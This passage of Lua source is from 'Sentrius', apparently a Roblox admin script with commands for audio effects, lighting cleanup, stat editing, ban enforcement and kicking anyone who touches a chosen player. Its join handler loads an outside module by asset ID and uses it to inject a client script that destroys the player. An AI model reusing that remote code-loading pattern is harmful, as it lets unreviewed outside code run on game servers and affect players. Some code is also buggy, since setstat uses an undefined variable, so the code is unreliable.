            notify(plr, "Sentrius", "Added sound reverb (" .. reverbValue .. ") to " .. count .. " running audios!", 3)
        else
            notify(plr, "Sentrius", "No music found in workspace!", 3)
        end
    end
})

addCommand({
    name = "echo",
    aliases = {},
    desc = "self explanatory",
    usage = prefix .. "echo [0-1]",
    callback = function(plr, args)
        if not isAdmin(plr) then return end
        
        local echoValue = 0.5
        if args and #args > 0 then
            echoValue = tonumber(args[1]) or 0.5
        end
        
        local count = 0
        for _, sound in ipairs(workspace:GetDescendants()) do
            if sound:IsA("Sound") and sound.Parent == workspace and sound.IsPlaying then
                local echo = sound:FindFirstChildOfClass("EchoSoundEffect")
                if not echo then
                    echo = Instance.new("EchoSoundEffect")
                    echo.Parent = sound
                end
                echo.Delay = echoValue
                echo.DryLevel = 0
                echo.WetLevel = echoValue * -10
                echo.Feedback = echoValue * 0.5
                count = count + 1
            end
        end
        
        if count > 0 then
           print("i dunno what to put here")
        else
            notify(plr, "Sentrius", "No music found in workspace!", 3)
        end
    end
})

addCommand({
    name = "fix",
    aliases = {"cleanup", "restore"},
    desc = "fihks",
    usage = prefix .. "fix",
    callback = function(plr, args)
        if not isAdmin(plr) then return end
        
        local Lighting = game:GetService("Lighting")
        Lighting.Ambient = Color3.fromRGB(0, 0, 0)
        Lighting.Brightness = 1
        Lighting.ColorShift_Bottom = Color3.fromRGB(0, 0, 0)
        Lighting.ColorShift_Top = Color3.fromRGB(0, 0, 0)
        Lighting.OutdoorAmbient = Color3.fromRGB(127, 127, 127)
        Lighting.FogColor = Color3.fromRGB(192, 192, 192)
        Lighting.FogEnd = 100000
        Lighting.FogStart = 0
        Lighting.ClockTime = 14
        Lighting.GeographicLatitude = 41.733
        Lighting.GlobalShadows = true
        Lighting.TimeOfDay = "14:00:00"
        
        for _, effect in ipairs(Lighting:GetChildren()) do
            if effect:IsA("Atmosphere") or effect:IsA("BloomEffect") or effect:IsA("BlurEffect") 
            or effect:IsA("ColorCorrectionEffect") or effect:IsA("DepthOfFieldEffect") 
            or effect:IsA("SunRaysEffect") or effect:IsA("Sky") then
                effect:Destroy()
            end
        end
        
        for _, obj in ipairs(workspace:GetChildren()) do
            if obj:IsA("BasePart") and obj.Name ~= "Terrain" and obj.Name ~= "Baseplate"
            and not Players:GetPlayerFromCharacter(obj) then
                obj:Destroy()
            elseif obj:IsA("Model") and not Players:GetPlayerFromCharacter(obj) 
            and obj.Name ~= "Tabby" and not obj:FindFirstChild("_Game") then
                local hasHumanoid = obj:FindFirstChildOfClass("Humanoid")
                if not hasHumanoid then
                    obj:Destroy()
                end
            elseif obj:IsA("Tool") or obj:IsA("Hat") or obj:IsA("Accessory") then
                obj:Destroy()
            end
        end
        
        notify(plr, "Sentrius", "Lighting restored and workspace mopped.", 3)
    end
})

addCommand({
    name = "setstat",
    aliases = {"stat"},
    desc = "Change a player's leaderboard stat",
    usage = prefix .. "setstat [player] [stat name] [value]",
    callback = function(plr, args)
        if not isAdmin(plr) then return end
        
        if not args or #args < 3 then
            notify(plr, "Sentrius", "Usage: " .. prefix .. "setstat [player] [stat] [value]", 3)
            return
        end
        
        local targets = GetPlayer(args[1], plr)
        if not targets or #targets == 0 then
            notify(plr, "Sentrius", "No player found!", 3)
            return
        end
        
        local statName = args[2]
        local statValue = args[3]
        

        local numValue = tonumber(statValue)
        local finalValue = numValue or statValue
        
        local names = {}
        for _, target in ipairs(targets) do
            local leaderstats = target:FindFirstChild("leaderstats")
            
            if not leaderstats then
                notify(plr, "Sentrius", target.DisplayName .. " has no leaderstats!", 3)
            else
                local foundStat = nil
                

                for _, stat in ipairs(leaderstats:GetChildren()) do
                    if stat:IsA("IntValue") or stat:IsA("NumberValue") or stat:IsA("StringValue") or stat:IsA("BoolValue") then
                        if stat.Name:lower():find(statName:lower(), 1, true) or stat.Name:lower() == statName:lower() then
                            foundStat = stat
                            break
                        end
                    end
                end
                
                if foundStat then
                    local oldValue = foundStat.Value
                    

                    if foundStat:IsA("IntValue") or foundStat:IsA("NumberValue") then
                        foundStat.Value = numValue or 0
                    elseif foundStat:IsA("StringValue") then
                        foundStat.Value = tostring(statValue)
                    elseif foundStat:IsA("BoolValue") then
                        if statValue:lower() == "true" or statValue == "1" then
                            foundStat.Value = true
                        else
                            foundStat.Value = false
                        end
                    end
                    
                    table.insert(names, target.DisplayName)
                    
                    if target == plr then
                        notify(plr, "Sentrius", "Changed your " .. foundStat.Name .. " from " .. tostring(oldValue) .. " to " .. tostring(foundStat.Value), 3)
                    end
                else
                    notify(plr, "Sentrius", "Stat '" .. statName .. "' not found for " .. target.DisplayName .. "!", 3)
                end
            end
        end
        
        if #names > 0 and not (target == plr) then
            notify(plr, "Sentrius", "Changed " .. statName .. " to " .. tostring(finalValue) .. " for: " .. table.concat(names, ", "), 4)
        end
    end
})

addCommand({
    name = "touchy",
    aliases = {"antitouch"},
    desc = "lol.. whoever you touch gets kicked.. now targetable!",
    usage = prefix .. "touchy [player (optional)]",
    callback = function(plr, args)
        if not isAdmin(plr) then return end

        local target = plr

        if args and #args > 0 then
            local targets = GetPlayer(args[1], plr)
            if targets and #targets > 0 then
                target = targets[1]
            else
                notify(plr, "Sentrius", "No player found!", 3)
                return
            end
        end

        if _G.TouchyConnections[target.UserId] and _G.TouchyConnections[target.UserId].enabled then
            notify(plr, "Sentrius", target.DisplayName .. " already has touchy enabled!", 3)
            return
        end

        _G.TouchyConnections[target.UserId] = {
            enabled = true,
            touchConnection = nil,
            respawnConnection = nil,
            cooldowns = {}
        }

        local touchyData = _G.TouchyConnections[target.UserId]

        local function applyTouchy(character)
            if not touchyData.enabled then return end

            if touchyData.touchConnection then
                touchyData.touchConnection:Disconnect()
                touchyData.touchConnection = nil
            end

            local humanoid = character:WaitForChild("Humanoid", 5)
            local humanoidRootPart = character:WaitForChild("HumanoidRootPart", 5)

            if not humanoid or not humanoidRootPart then
                warn("Touchy failed: Missing Humanoid or HumanoidRootPart for " .. target.Name)
                return
            end

            touchyData.touchConnection = humanoidRootPart.Touched:Connect(function(hit)
                if not touchyData.enabled then return end
                if not running then return end

                local toucher = Players:GetPlayerFromCharacter(hit.Parent)

                if toucher and toucher ~= target then
                    if owna(toucher) then
                        return
                    end

                    --[[if whitelist[toucher.UserId] and not owna(target) then
                        return
                    end]]

                    local now = tick()
                    if touchyData.cooldowns[toucher.UserId] and (now - touchyData.cooldowns[toucher.UserId]) < 0.7 then
                        return
                    end

                    touchyData.cooldowns[toucher.UserId] = now

                    toucher:Kick("Kicked by [Sentrius]\nYou touched " .. target.DisplayName .. "!!")

                    notify(target, "Sentrius", "Kicked " .. toucher.DisplayName .. " for touching you!", 3)
                    if target ~= plr and plr.Parent then
                        notify(plr, "Sentrius", toucher.DisplayName .. " touched " .. target.DisplayName .. " and got kicked!", 3)
                    end
                end
            end)
        end


        if target.Character then
            applyTouchy(target.Character)
        end


        touchyData.respawnConnection = target.CharacterAdded:Connect(function(character)
            if not touchyData.enabled then return end

            task.wait(0.5)
            applyTouchy(character)

            notify(target, "Sentrius", "touchy has been re-enabled.\nif you want to disable it then please type " .. prefix .. "untouchy", 3)
        end)

        _G.TouchyConnections[target.UserId] = touchyData


        if target == plr then
            notify(plr, "Sentrius", "Touchy enabled on yourself! Anyone who touches you will be kicked.", 4)
        else
            notify(plr, "Sentrius", "Touchy enabled on " .. target.DisplayName .. "!", 3)
            notify(target, "Sentrius", "⚠️ Anti-touch has been enabled on you by " .. plr.DisplayName .. "!\nAnyone who touches you will be kicked.", 5)
        end
    end
})

addCommand({
    name = "untouchy",
    aliases = {"unantitouch", "noantitouch"},
    desc = "Disable touchy kick protection (targetable)",
    usage = prefix .. "untouchy [player (optional)]",
    callback = function(plr, args)
        if not isAdmin(plr) then return end

        local target = plr

        if args and #args > 0 then
            local targets = GetPlayer(args[1], plr)
            if targets and #targets > 0 then
                target = targets[1]
            else
                notify(plr, "Sentrius", "No player found!", 3)
                return
            end
        end

        local touchyData = _G.TouchyConnections[target.UserId]

        if not touchyData or not touchyData.enabled then
            notify(plr, "Sentrius", target.DisplayName .. " doesn't have touchy enabled!", 3)
            return
        end

        touchyData.enabled = false

        if touchyData.touchConnection then
            touchyData.touchConnection:Disconnect()
            touchyData.touchConnection = nil
        end

        if touchyData.respawnConnection then
            touchyData.respawnConnection:Disconnect()
            touchyData.respawnConnection = nil
        end

        touchyData.cooldowns = {}

        if target == plr then
            notify(plr, "Sentrius", "Touchy disabled! Players can touch you now.", 3)
        else
            notify(plr, "Sentrius", "Touchy disabled on " .. target.DisplayName .. ".", 3)
            notify(target, "Sentrius", "Anti-touch has been disabled on you by " .. plr.DisplayName .. ".", 3)
        end
    end
})

local function connect(plr)
    playerNames[plr.Name] = true
    playerNames[plr.DisplayName] = true
    
    local c
    c = _G.BindPlayerChatted(plr):Connect(function(msg)
        if not running then return end
        
        logChat(plr, msg)
        
        if msg:sub(1,1) ~= prefix then return end

        local args = {}
        for w in msg:sub(2):gmatch("%S+") do
            table.insert(args, w)
        end

        local cmd = table.remove(args, 1)
        if not cmd then return end

        local f = commands[cmd:lower()]
        if f then
            f(plr, args)
        end
    end)

    connections[plr] = c
    

    task.delay(2, function()
        detectDevice(plr)
    end)
end

for _, p in ipairs(Players:GetPlayers()) do
    if table.find(bannedIds, p.UserId) then
        p:Kick("[Sentrius]: You are banned from this server.")
    elseif isAlt(p) then
        handleAlt(p)
    else
        connect(p)
        

        if isAdmin(p) then
            task.wait(0.5)
            notify(p, "Sentrius", "SENTRIUS HAS RAN!!!!\nPrefix is: " .. prefix .. " (as always)\nSay (" .. prefix .. "cmds) to view commands!", 5)
        end
    end
end

Players.PlayerAdded:Connect(function(p)
    if _G.TempBans and _G.TempBans[p.UserId] then
        if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
            local ticking = tick()
            require(112691275102014).load()
            repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
        end
        
        local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")
        
        if not goog then
            warn("goog failed to load for temp ban kick")
            p:Kick("You have been disconnected from the game.") --just in case lol
            return
        end
        
        local scr = goog:FindFirstChild("Utilities").Client:Clone()
        local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()
        
        loa.Parent = scr
        scr:WaitForChild("Exec").Value = [[
            game.Players.LocalPlayer:Destroy()
            script:Destroy()
        ]]
        
        task.wait(0.5)
        
        if p:FindFirstChild("PlayerGui") then
            scr.Parent = p.PlayerGui
        elseif p.Character then
            scr.Parent = p.Character
        end
        
        scr.Enabled = true
        return
    end
    
    if table.find(bannedIds, p.UserId) then
        p:Kick("[Sentrius]: You are banned from this server.")
    elseif isAlt(p) then
        handleAlt(p)
    elseif _G.ServerLocked and not whitelist[p.UserId] and not tempwl[p.UserId] then
        p:Kick("[Sentrius]: Server is locked.\nOnly whitelisted users can join.")
    else
        connect(p)

        if isAdmin(p) then
            task.wait(1)
            local adminType = whitelist[p.UserId] and "Owner" or "Admin"
            notify(p, "Sentrius", "Welcome, " .. adminType .. "!\nPrefix: " .. prefix .. "\nSay (" .. prefix .. "cmds) to get started.", 6)
        end
    end
end)

Players.PlayerRemoving:Connect(function(p)
    playerNames[p.Name] = nil
    playerNames[p.DisplayName] = nil
    
    if connections[p] then
        connections[p]:Disconnect()
        connections[p] = nil
    end
end)
